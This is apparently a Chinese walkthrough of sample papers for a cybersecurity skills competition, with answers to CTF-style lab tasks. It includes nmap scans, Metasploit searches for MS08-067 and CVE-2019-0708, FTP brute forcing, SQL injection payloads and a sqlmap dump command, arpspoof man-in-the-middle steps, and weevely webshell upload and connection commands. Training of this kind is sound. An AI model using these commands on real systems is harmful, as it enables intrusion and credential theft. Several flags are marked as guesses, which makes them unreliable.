恶意用户下载了什么文件，并将文件名及后缀作为Flag值提交;\n\n追踪shell2.php的TCP流：\n\n![](http://cdn.anyiblog.top/common/1649213824875-3360f4ee-beb5-41f3-ab34-9271eb34b68b.jpg)\n该文件即恶意用户下载的文件 再将参数进行分析即可。\n\n我们在该包下发现了路径：\n\n![](http://cdn.anyiblog.top/common/1649213826223-f52e8ed0-5326-4156-b220-68190a2e5b95.jpg)\nFLAG:connect.php\n\n  \n\n7.继续查看数据包文件Bravo-1.pcapng将Web服务器连接的数据库名作为Flag值提交。\n\n追踪TCP流时发现：\n\n![](http://cdn.anyiblog.top/common/1649213826833-f9e3959f-d43f-466a-883b-129aed68290c.jpg)\n数据库即kingsman\n\nFLAG:kingsman\n\n  \n\n### B-9任务九：CVE-2019-0708漏洞利用\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server1进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\nnmap -n -sV -oX target 10.140.98.232\n\n![](http://cdn.anyiblog.top/common/1649213827833-b884ef24-c757-4ad2-8630-8f7fd60cd7b3.jpg)\nFLAG:ox\n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213828632-e23a3fd4-4046-4249-a2ee-e3e4284bd212.jpg)\nFLAG:msfdb init\n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\ndb\\_import target\n\n![](http://cdn.anyiblog.top/common/1649213829025-1a7f66a5-6234-4ca5-8730-de5957118a67.jpg)\nhosts查看\n\n![](http://cdn.anyiblog.top/common/1649213829404-c3bcd62d-90b1-47cf-a7fb-77d5eeac88f2.jpg)\nFLAG:hosts\n\n4.在MSF工具中用search命令搜索CVE-2019-0708漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值（如：2017-10-16）提交;\n\nsearch CVE-2019-0708\n\n![](http://cdn.anyiblog.top/common/1649213830302-1bc7a277-23ac-4498-8c71-a6872f19159a.jpg)\nFLAG:2019-05-14\n\n5.在MSF工具中调用CVE-2019-0708漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\n  \n\n![](http://cdn.anyiblog.top/common/1649213830700-89475bdb-d894-4ba2-9cb6-7b360728eaa5.jpg)\nFLAG:completed\n\n  \n\n### B-10任务十：Wireshark数据包分析\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.使用Wireshark查看并分析PYsystem20191桌面下的capture4.pcap数据包文件，找出黑客获取到的可成功登录目标服务器FTP的账号密码，并将黑客获取到的账号密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n2.继续分析数据包capture4.pcap，找出黑客使用获取到的账号密码登录FTP的时间，并将黑客登录FTP的时间作为Flag值（例如：14:22:08）提交；\n\n3.继续分析数据包capture4.pcap，找出黑客连接FTP服务器时获取到的FTP服务版本号，并将获取到的FTP服务版本号作为Flag值提交；\n\n4.继续分析数据包capture4.pcap，找出黑客成功登录FTP服务器后执行的第一条命令，并将执行的命令作为Flag值提交;\n\n5.继续分析数据包capture4.pcap，找出黑客成功登录FTP服务器后下载的关键文件，并将下载的文件名称作为Flag值提交；\n\n6.继续分析数据包capture4.pcap，找出黑客暴力破解目标服务器Telnet服务并成功获取到的用户名与密码，并将获取到的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n7.继续分析数据包capture4.pcap，找出黑客在服务器网站根目录下添加的文件，并将该文件的文件名称作为Flag值提交；\n\n8.继续分析数据包capture4.pcap，找出黑客在服务器系统中添加的用户，并将添加的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交。\n\n  \n\n  \n\n# 国赛例卷5：\n\n### B-1任务一：Linux系统安全 （国赛例卷3 B-8）\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server1进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.找到Flag3作为Flag值提交。\n\n  \n\n### B-2任务二：漏洞扫描与利用\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server2进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\nnmap -n -sV -oX target 10.140.98.232\n\n![](http://cdn.anyiblog.top/common/1649213834832-0fe1dcf5-4389-4600-8647-af8c49323ca3.jpg)\nFLAG:oX\n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213836257-037dd93d-12a5-43ce-a2d8-f3cceebebf40.jpg)\nFLAG:msfdb init\n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\ndb\\_import target\n\n![](http://cdn.anyiblog.top/common/1649213836617-242fe54f-f02f-4aad-b0d8-a2d5c7747e2e.jpg)\nhosts查看\n\n![](http://cdn.anyiblog.top/common/1649213836982-e1240c02-135c-45f9-aea8-98a3a878ed4e.jpg)\nFLAG:hosts\n\n4.在MSF工具中用search命令搜索搜索MS08067漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值（如：2017-10-16）提交；\n\nsearch 08\\_067\n\n![](http://cdn.anyiblog.top/common/1649213837618-e7ad968e-67e2-4380-b0cf-c708e3faff77.jpg)\nFLAG:2008-10-28\n\n5.在MSF工具中调用MS08067漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213837985-eb5d20c2-a95d-48ac-a2db-282439a312f1.jpg)\nFLAG:created\n\n  \n\n### B-3任务三：Web安全应用\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.通过渗透机扫描靶机中运行的服务，将完整的HTTP服务名称作为Flag值提交；\n\nnmap -sV -n -p80 10.140.98.239 / nikto -h 10.140.98.239\n\n  \n\n![](http://cdn.anyiblog.top/common/1649213838609-c2d7bcb6-6b63-424e-9044-1354fc6ea902.jpg)\n![](http://cdn.anyiblog.top/common/1649213839461-35cff697-3cc1-4638-a532-86f8008b521e.jpg)\nFLAG:Microsoft-IIS/7.5\n\n2.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/rececit/enehevibo.php，通过密码破译得到明文密码，并将明文密码作为Flag值提交；\n\n无环境\n\n3.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/irascence/futuresive.php，通过密码破译得到明文密码，并将明文密码作为Flag值提交；\n\n无环境\n\n4.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/economyia/tortly.php，通过密码破译进入新的页面，并将新页面的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n无环境\n\n5.在新的页面中，通过解密页面内容获得密码，并将密码作为Flag值提交；\n\n无环境\n\n6.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/corticory/heseur.php，通过解密页面内容得到密码，并将密码作为Flag值提交。\n\n无环境\n\n  \n\n### B-4任务四：流量分析\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.通过Kali访问目标靶机[http://xxx.xxx.xxx.xxx:8081(xxx.xxx.xxx.xxx](http://xxx.xxx.xxx.xxx:8081(xxx.xxx.xxx.xxx/)为靶机IP地址,例如172.16.101.1:8081)下载文件获取流量包。将流量包进行解压，获取流量包中的文件名作为Flag值（形式：文件名.文件类型）提交；\n\n![](http://cdn.anyiblog.top/common/1649213844239-37e20644-5780-4365-b76d-ac445afbd7f2.jpg)\nFLAG:misc-1.pcapng\n\n2.通过Kali中利用wireshark从服务器场景Server4中下载的流量包进行流量包分析，使用HTTP模式下的过滤表达式过滤HTTP GET方法的流量包，过滤表达式命令作为Flag值提交；\n\nFLAG:http.request.method\n\n3.根据第2步回显信息从过滤出的流量包中分析，找到Flag值文件流量的IP地址，并将该HTTP流量包（第1步中下载的流量包）含Flag值信息的请求源ip作为Flag值提交；\n\n可以Ctrl+F字符串查找flag字符\n\n找到flag值后IP即Source一段的IP\n\n![](http://cdn.anyiblog.top/common/1649213845519-06987bbf-77cf-4380-8316-7fff6a8360c9.jpg)\nFLAG:192.168.199.212\n\n4.在渗透测试平台Kali中利用wireshark从包含Flag值信息的流量包中的IP数据包中找到目标信息文件，并将该文件名作为Flag值（形式：文件名.文件类型）提交；\n\n![](http://cdn.anyiblog.top/common/1649213846788-241e4cf9-71ce-48db-91d3-2a3c71698487.jpg)\nFLAG:flag.zip\n\n5.在渗透测试平台Kali中使用wireshark分析下载的流量包，并从包含Flag值信息的GET/POST请求流量中找出响应IP及响应内容，并将该Flag值请求的响应IP（流量包中的IP）作为Flag值提交；\n\nDestination一段的IP\n\n![](http://cdn.anyiblog.top/common/1649213848243-46166786-2224-4d74-b558-7f7f895e4220.jpg)\nFLAG:192.168.199.203\n\n6.使用wireshark工具分析响应流量包（第5步Flag值请求对应的response响应流量数据包）中的数据内容，将该响应数据中的文件名，作为Flag值（形式：文件名.文件类型）提交；\n\n追踪TCP流\n\n![](http://cdn.anyiblog.top/common/1649213848784-916f7e03-2de2-4ae4-a236-d715ef590bbd.jpg)\n选择原始数据 -> Save as flag.zip\n\n![](http://cdn.anyiblog.top/common/1649213850041-6ec63500-59fa-44de-a1d8-512ed58273d6.jpg)\n查看flag.zip\n\n![](http://cdn.anyiblog.top/common/1649213850676-d73f7089-7262-4199-aaa9-97b5a6945260.jpg)\nFLAG:ce.txt\n\n7.使用wireshark工具提取流量包中内容（即第6步响应流量包中的文件内容），将该提取操作必须使用的到的wireshark功能的快捷键作为Flag值（xx+xx为Flag值提交格式,例如ctrl+alt+F4）提交；\n\nFLAG:Ctrl+H\n\n8.将第7步提取出的文件进行解压，将该文件解压后的文件内容第一行作为Flag值提交。\n\n查看ce.txt即可。\n\n![](http://cdn.anyiblog.top/common/1649213852177-98fc1c89-337f-4c0d-ad09-dec3c0bd6c32.jpg)\nFLAG:254, 255, 255\n\n  \n\n### B-5任务五：FTP弱口令渗透测试\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描服务器场景Server5所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为Flag值提交（忽略ip地址）；\n\nnmap -p21,22,23 172.16.101.0/24\n\nFLAG:-p 21,22,23\n\n2.通过渗透机Kali2.0对服务器场景Server5进行系统服务及版本扫描渗透测试，并将该操作显示结果中FTP服务对应的服务端口信息作为Flag值提交；\n\nnmap -n -sV -p21 10.140.98.247\n\n![](http://cdn.anyiblog.top/common/1649213852637-a78b1bbf-6478-4367-89d1-f30c87975f5c.jpg)\nFLAG:21/tcp\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\nsearch ftp\\_login\n\n![](http://cdn.anyiblog.top/common/1649213853252-0a5d10a2-2828-4e99-a4e4-663fc960737b.jpg)\nFLAG:auxiliary/scanner/ftp/ftp\\_login\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值提交（之间以英文逗号分隔，例hello,test，..,..）；\n\nFLAG:RHOSTS,PASS\\_FILE,THREADS,USERNAME\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\nFLAG:set RHOSTS\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt,用户名为test爆破获取密码并将得到的密码作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213863721-925d4fc3-7607-44fa-9134-0b42728e9cc7.jpg)\nFLAG:aaaab1\n\n7.在上一题的基础上，使用第6题获取到的密码登陆ftp服务，将该目录中Flag值2.bmp的图片文件中的英文单词作为Flag值提交。\n\n无环境\n\n### B-6任务六：Web渗透测试\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1. 通过渗透机扫描同网段内网中的NBT服务（使用NBTscan工具），将执行内网扫描必须使用的参数作为Flag值提交；\n\nnbtscan -r 10.140.98.0/24\n\n![](http://cdn.anyiblog.top/common/1649213864473-acb81792-b459-4478-adf9-3c01fed96bee.jpg)\nFLAG:r\n\n2. 通过渗透机扫描靶机80 HTTP服务的目录（使用字典dict.txt，使用工具DirBuster），将后台管理页面的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\nDirbuster\n\n![](http://cdn.anyiblog.top/common/1649213865962-edb2c4f2-dda4-4336-b2de-308bea41a9f8.jpg)\n  \n\n猜测FLAG:http://172.16.1.1/admin\n\n3. 通过渗透机的火狐浏览器登入靶机HTTP站点的后台管理系统，找到后台管理系统中的漏洞位置，将漏洞位置的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n猜测漏洞位置存在SQL注入漏洞\n\n猜测FLAG:http://172.16.1.1/admin/page.php\n\n4. 通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的库名作为Flag值提交；\n\n1' union select database(),2,3 # //获取数据库名\n\n猜测FLAG:wordpress\n\n5. 通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的用户名作为Flag值提交；\n\n1' union select user(),2,3 # //获取用户名\n\n猜测FLAG:admin\n\n6. 通过渗透机对靶机漏洞进行渗透测试，将靶机数据库的密码作为Flag值提交。\n\nSQLMAP跑\n\nsqlmap -u [http://172.13.2.249/page.php?id=1](http://172.13.2.249/page.php?id=1) \\-D test -T users --dump //获得密码\n\n猜测FLAG:password\n\n  \n\n### B-7任务七：中间人攻击渗透测试\n\n\\*任务说明：仅能获取Server7的IP地址\n\n\\*任务说明：仅能获取Server11的IP地址\n\n1.通过上题渗透后得到控制权限的服务器场景Server7进行查看本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\narp -a\n\n![](http://cdn.anyiblog.top/common/1649213866330-3d869f17-b8cf-4c3b-8cfd-bbc11e2ed523.jpg)\nFLAG:arp -a\n\n2.通过上题渗透后得到控制权限的服务器场景Server7进行清除本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\narp -d\n\n![](http://cdn.anyiblog.top/common/1649213866678-696d9a4b-94dc-40cf-9b7f-c5ddbc34f372.jpg)\nFLAG:arp -d\n\n3.通过本地PC中渗透测试平台Kali对服务器场景Server7以及服务器场景Server11进行中间人攻击渗透测试，打开渗透测试平台Kali的路由转发功能，并将该配置文件的绝对路径作为Flag值提交；\n\necho \"1\" > /proc/sys/net/ipv4/ip\\_forward\n\nFLAG: /proc/sys/net/ipv4/ip\\_forward\n\n4.通过本地PC中渗透测试平台Kali对服务器场景Server7以及服务器场景Server11进行中间人攻击渗透测试，通过arpspoof命令对客户端Server7以及服务器Server11进行arp污染 ，并将该操作必须要用到的参数作为Flag值提交；\n\narpspoof –i eth0 –t 172.16.1.15 172.16.1.19\n\nFLAG:t\n\n5.中间人渗透攻击成功后，渗透测试平台kali能够监听到客户端Server7向服务器Server11中的login.php页面提交的登陆网站用户名，密码信息，使用服务器场景Server7桌面上的Chrome浏览器，访问Server11服务器场景的Web站点[http://Linux](http://linux/)靶机ip/login.php，使用已经保存好的用户名，密码直接登录，并在kali上使用抓包软件wireshark进行抓包，设置wireshark过滤规则，过滤所有请求方式为POST的http请求包，将需要使用的过滤器表达式作为Flag值（\\==符号前后不要加空格）提交；\n\n![](http://cdn.anyiblog.top/common/1649213870652-546d8c1e-7b59-4e27-b0b0-4f2a7533289d.jpg)\nFLAG:http.request.method==POST\n\n6.分析抓到的POST请求包，并将POST请求内容中客户端Server7向服务器Server11中的login.php页面提交的登陆网站admin用户的密码作为Flag值提交。\n\n![](http://cdn.anyiblog.top/common/1649213873843-0e376da7-3441-4743-aca2-73a2ab8f8d7c.jpg)\nFlag：iNDs1r3Q\n\n  \n\n### B-8任务八：隐写术应用（无环境）\n\n\\*任务说明：仅能获取Server8的IP地址\n\n猜测存在图片高度隐写、文件隐写其他文件、GIF提取帧等等\n\n1.找出文件夹1中的文件，将文件中的隐藏信息作为Flag值提交；\n\n2.找出文件夹2中的文件，将文件中的隐藏信息作为Flag值提交；\n\n3.找出文件夹3中的文件，将文件中的隐藏信息作为Flag值提交；\n\n4.找出文件夹4中的文件，将文件中的隐藏信息作为Flag值提交；\n\n5.找出文件夹5中的文件，将文件中的隐藏信息作为Flag值提交。\n\n  \n\n### B-9任务九：文件上传渗透测试\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.通过渗透机Kali2.0对服务器场景Server9进行网站目录暴力枚举测试（使用工具DirBuster，扫描服务器80端口），选择使用字典（使用默认字典directory-list-2.3-medium.txt）方式破解，并设置模糊测试的变量为“{dir}”，将回显信息中从上往下数第六行的数字作为Flag值提交；\n\ndirbuster\n\n![](http://cdn.anyiblog.top/common/1649213874826-3728b396-1ff1-4b51-96fb-9d8d1dde2eb7.jpg)\n![](http://cdn.anyiblog.top/common/1649213875319-42dd6e26-4ff8-4c43-a721-e3479ac3588e.jpg)\nFLAG:301\n\n2.通过渗透机Kali2.0对服务器场景Server9进行网站目录暴力枚举测试（使用工具DirBuster，扫描服务器80端口），通过分析扫描结果，找到上传点并使用火狐浏览器访问包含上传点的页面，并将访问成功后的页面第一行的第一个单词作为Flag值提交；\n\nurl：http://IP/uploads\n\n![](http://cdn.anyiblog.top/common/1649213875707-9e3bbdfc-bd30-4b1f-9429-3e41098e3909.jpg)\nFLAG:Upload\n\n3.访问成功后上传名为backdoor.php的php一句话木马至服务器，打开控制台使用网站安全狗检测本地是否存在木马，若检测出存在木马，则将木马所在的绝对路径作为Flag值提交，若未检测出木马则提交false；\n\n![](http://cdn.anyiblog.top/common/1649213877207-49cbdeb6-84fc-4945-9cb9-a48cb86aef43.jpg)\nFLAG:c:/appserv/www/uploadfile/uploads\n\n4.通过渗透机Kali2.0对服务器场景Server9进行文件上传渗透测试，使用工具weevely在/目录下生成一个木马，木马名称为backdoor.php，密码为pass，该操作使用命令中固定不变的字符串作为Flag值提交；\n\nFLAG:weevely generate pass backdoor.php\n\n5.上传使用weevely生成的木马backdoor1.php至服务器中，打开控制台使用网站安全狗检测本地是否存在木马，若检测出存在木马，则将木马所在的绝对路径作为Flag值提交，若未检测出木马则提交false；\n\n![](http://cdn.anyiblog.top/common/1649213878282-87fe732a-6e4e-43f9-b776-8a1ebc3fecde.jpg)\nFLAG:false\n\n6.通过渗透机Kali2.0对服务器场景Server9进行文件上传渗透测试（使用工具weevely，连接目标服务器上的木马文件），连接成功后将目标服务器主机名的字符串作为Flag值提交；\n\nweevely [http://10.140.98.232/uploads/uploads/backdoor.php](http://10.140.98.232/uploads/uploads/backdoor.php) pass\n\n![](http://cdn.anyiblog.top/common/1649213879372-186c20ae-b52b-4848-ae85-011d284854f2.jpg)\nFLAG:PC6249546\n\n7.开启网站安全狗的所有防护，再次使用weevely生成一个新的木马文件并将其上传至目标服务器，将上传后页面提示的第二行内容作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213879838-e9bf2ad7-9ba1-4580-90f2-b4289caf99a7.jpg)\nFLAG:Upload failed\n\n8.开启网站安全狗的所有防护，再次使用weevely生成木马文件并将其上传至目标服务器，要求能够上传成功，将生成该木马必须要使用的参数作为Flag值提交。\n\nFLAG:generate\n\n  \n\n### B-10任务十：主机发现与信息收集\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.通过渗透机Kali2.0对靶机场景进行秘密FIN扫描 (使用Nmap工具)，并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -n -sF 10.140.98.232\n\nFLAG:sF\n\n2.通过渗透机Kali2.0对靶机场景进行秘密FIN扫描 (使用Nmap工具)，并将该操作显示结果中从下往上数第7行的端口信息作为Flag值提交；\n\n无环境\n\n3.通过渗透机Kali2.0对靶机场景进行圣诞树（Xmas Tree）扫描（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -n -sX 10.140.98.232\n\nFLAG:sX\n\n4.通过渗透机Kali2.0对靶机场景进行圣诞树（Xmas Tree）扫描（使用Nmap工具），并将该操作显示结果中从下往上数第5行的服务名称作为Flag值提交；\n\n无环境\n\n5.通过渗透机Kali2.0对靶机场景使用SYN包而不是用ACK包进行扫描渗透测试（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -n -PS 10.140.98.232\n\nFLAG:PS\n\n6.通过渗透机Kali2.0对靶机场景使用SYN包而不是用ACK包进行扫描渗透测试（使用Nmap工具），并将该操作显示结果中从下往上数第8行的服务状态作为Flag值提交；\n\n无环境\n\n7.通过渗透机Kali2.0对靶机场景进行ACK和ICMP两种扫描类型并行的扫描渗透测试（使用Nmap工具）,并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -n -PB 10.140.98.232 或 nmap -n -sP 10.140.98.232\n\nFLAG:PB 或 sP\n\n8.通过渗透机Kali2.0对靶机场景进行ACK和ICMP两种扫描类型并行的扫描渗透测试（使用Nmap工具）,并将该操作显示结果中从下往上数第3行的服务名称作为Flag值提交。\n\n无环境\n\n  \n\n# 国赛例卷6：\n\n### B-1任务一：主机发现与信息收集\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过渗透机渗透机BT5使用fping对服务器场景Server1所在网段(例如：172.16.101.0/24)进行主机发现扫描,并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nfping -g 172.16.101.0/24\n\nFLAG:g\n\n2.通过渗透机渗透机Kali2.0使用genlist对服务器场景Server1所在网段进行扫描进行主机存活发现, 并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\ngenlist -s 172.16.101.\\\\\\*\n\nFLAG:s\n\n3.通过渗透机渗透机Kali2.0使用nbtscan对服务器场景Server1所在网段进搜索扫描，获取目标的MAC地址等信息，并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nnbtscan -r 172.16.101.0/24\n\nFLAG:r\n\n4.假设服务器场景Server1设置了防火墙无法进行ping检测，通过渗透机渗透机Kali2.0使用arping检测主机连通性扫描（发送请求数据包数量为4个），并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\narping -c 4\n\nFLAG:c\n\n5.通过渗透机渗透机Kali2.0使用fping对服务器场景Server1所在网段进行存活性扫描，且要把最终扫描的存活主机输出到文件ip.txt中，并将该操作使用的命令中必须要使用的参数作为Flag值（各参数之间用英文逗号分割，例a,b）提交；\n\nfping -ag 172.16.101.0/24 > ip.txt\n\nFLAG:a,g\n\n6.通过渗透机渗透机Kali2.0使用nbtscan从第5题的ip.txt文件中读取IP扫描主机信息MAC地址等信息，并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\nnbtscan -f ip.txt\n\nFLAG:f\n\n7.通过渗透机渗透机Kali2.0使用xprobe2对服务器场景Server1进行TCP扫描，仅扫描靶机80,3306端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为Flag值提交；\n\nxprobe2 -T 80,3306 172.16.101.0\n\nFLAG:T\n\n8.通过渗透机渗透机Kali2.0使用xprobe2对服务器场景Server1进行UDP扫描，仅扫描靶机161,162端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为Flag值提交。\n\nxprobe2 -U 161,162 172.16.101.0\n\nFLAG:U\n\n  \n\n### B-2任务二：文件上传渗透测试（国赛例卷5 B-9）\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.通过渗透机Kali2.0对服务器场景Server2进行网站目录暴力枚举测试（使用工具DirBuster，扫描服务器80端口），选择使用字典（使用默认字典directory-list-2.3-medium.txt）方式破解，并设置模糊测试的变量为“{dir}”，将回显信息中从上往下数第六行的数字作为Flag值提交；\n\n2.通过渗透机Kali2.0对服务器场景Server2进行网站目录暴力枚举测试（使用工具DirBuster，扫描服务器80端口），通过分析扫描结果，找到上传点并使用火狐浏览器访问包含上传点的页面，并将访问成功后的页面第一行的第一个单词作为Flag值提交；\n\n3.访问成功后上传名为backdoor.php的php一句话木马至服务器，打开控制台使用网站安全狗检测本地是否存在木马，若检测出存在木马，则将木马所在的绝对路径作为Flag值提交，若未检测出木马则提交false；\n\n4.通过渗透机Kali2.0对服务器场景Server2进行文件上传渗透测试，使用工具weevely在/目录下生成一个木马，木马名称为backdoor.php，密码为pass，该操作使用命令中固定不变的字符串作为Flag值提交；\n\n5.上传使用weevely生成的木马backdoor1.php至服务器中，打开控制台使用网站安全狗检测本地是否存在木马，若检测出存在木马，则将木马所在的绝对路径作为Flag值提交，若未检测出木马则提交false；\n\n6.通过渗透机Kali2.0对服务器场景Server2进行文件上传渗透测试（使用工具weevely，连接目标服务器上的木马文件），连接成功后将目标服务器主机名的字符串作为Flag值提交；\n\n7.开启网站安全狗的所有防护，再次使用weevely生成一个新的木马文件并将其上传至目标服务器，将上传后页面提示的第二行内容作为Flag值提交；\n\n8.开启网站安全狗的所有防护，再次使用weevely生成木马文件并将其上传至目标服务器，要求能够上传成功，将生成该木马必须要使用的参数作为Flag值提交。\n\n  \n\n### B-3任务三：CVE-2019-0708漏洞利用（国赛例卷4 B-9）\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server3进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\n4.在MSF工具中用search命令搜索CVE-2019-0708漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值（如：2017-10-16）提交;\n\n5.在MSF工具中调用CVE-2019-0708漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\n  \n\n### B-4任务四：数据分析数字取证（国赛例卷4 B-8）\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.分析Server4桌面下的Bravo-1.pcapng数据包文件，通过分析数据包Bravo-1.pcapng找出恶意用户目录扫描的第2个目录名，并将该目录名作为Flag值提交;\n\n2.继续查看数据包文件Bravo-1.pcapng，分析出恶意用户通过哪个目录写入的一句话木马，并将该目录名作为Flag值提交;\n\n3.继续查看数据包文件Bravo-1.pcapng分析出恶意用户读取了服务器什么文件，并将该文件名及后缀作为Flag值提交;\n\n4.继续查看数据包文件Bravo-1.pcapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为Flag值提交;\n\n5.继续查看数据包文件Bravo-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话木马作为Flag值提交;\n\n6.继续查看数据包文件Bravo-1.pcapng分析出恶意用户下载了什么文件，并将文件名及后缀作为Flag值提交;\n\n7.继续查看数据包文件Bravo-1.pcapng将Web服务器连接的数据库名作为Flag值提交。\n\n  \n\n### B-5任务五：Linux系统安全（国赛例卷3 B-8）\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server5进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.找到Flag3作为Flag值提交。\n\n  \n\n### B-6任务六：Telnet弱口令渗透测试（国赛例卷3 B-7）\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.在渗透机Kali2.0中使用Zenmap工具扫描服务器场景Server6所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口，并将该操作使用的命令中必须要添加的字符串作为Flag值（忽略ip地址）提交；\n\n2.通过渗透机Kali2.0对服务器场景Server6进行系统服务及版本扫描渗透测试，并将该操作显示结果中TELNET服务对应的服务端口信息作为Flag值提交；\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为Flag值提交；\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（字段之间以英文逗号分隔，例hello,test，..,..）提交；\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为user爆破获取密码并将得到的密码作为Flag值提交；\n\n7.在上一题的基础上，使用第6题获取到的密码telnet到靶机，将桌面上Flag值.bmp的图片文件中的英文单词作为Flag值提交。\n\n  \n\n### B-7任务七：中间人攻击渗透测试（国赛例卷5 